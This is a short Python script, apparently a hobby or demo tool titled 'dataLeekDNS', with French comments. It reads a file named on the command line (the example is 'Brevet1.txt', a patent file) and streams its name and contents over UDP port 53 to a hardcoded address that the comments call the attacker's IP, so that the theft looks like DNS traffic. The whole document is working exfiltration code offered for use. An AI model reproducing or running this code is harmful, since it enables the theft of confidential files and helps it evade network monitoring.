

from socket import *
import sys

print """
      _           _             _                      _      _____    _   _    _____ 
     | |         | |           | |                    | |    |  __ \  | \ | |  / ____|
   __| |   __ _  | |_    __ _  | |        ___    ___  | | __ | |  | | |  \| | | (___  
  / _` |  / _` | | __|  / _` | | |       / _ \  / _ \ | |/ / | |  | | | . ` |  \___ \ 
 | (_| | | (_| | | |_  | (_| | | |____  |  __/ |  __/ |   <  | |__| | | |\  |  ____) |
  \__,_|  \__,_|  \__|  \__,_| |______|  \___|  \___| |_|\_\ |_____/  |_| \_| |_____/ 
                @author Raphael DELAPORTE                                                                                  
                                                                                      

"""

s = socket(AF_INET,SOCK_DGRAM)
# On paramètre le socket avec l'ip du pirate et le port 53 = DNS

buf = 1024
addr = ("192.168.199.1",53)

# Le script prend en parametre le fichier a leek
# leex.exe "Brevet1.txt" par exemple

file_name=sys.argv[1]

s.sendto(file_name,addr)
#On ouvre le fichier rentrer en parametre et on lie l ensemble des donnees contenues dans ce fichier
f=open(file_name,"rb")
data = f.read(buf)
#Tant qu'il y a de la data on l envoi
while (data):
    if(s.sendto(data,addr)):
        data = f.read(buf)
       
# une fois le fichier vide on ferme le socket et le fichier
s.close()
f.close()


    
